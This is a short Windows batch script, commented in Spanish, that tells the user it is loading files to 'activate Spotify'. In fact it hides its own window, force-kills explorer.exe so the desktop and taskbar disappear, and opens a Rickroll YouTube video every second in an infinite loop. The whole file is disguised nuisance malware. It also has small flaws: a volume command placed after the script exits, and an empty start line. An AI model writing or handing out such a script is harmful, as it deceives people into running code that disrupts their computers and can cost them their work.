@echo off
title Importante
color 0A
echo Cargando archivos del sistema para activar spotify... 
timeout /t 3 /nobreak >nul

:: Ocultar la ventana del script al ejecutarse
if "%1"=="hidden" goto hidden
start /min cmd /c "%~f0 hidden"
exit
:: sube el volumen al 100%
nircmd.exe setsysvolume 65535

:hidden

:: Cerrar el Explorador de archivos (oculta barra de tareas y escritorio)
taskkill /f /im explorer.exe

:: Bucle infinito para abrir imágenes y páginas web
:loop
start https://www.youtube.com/watch?v=dQw4w9WgXcQ
start 

timeout /t 1 /nobreak >nul
goto loop
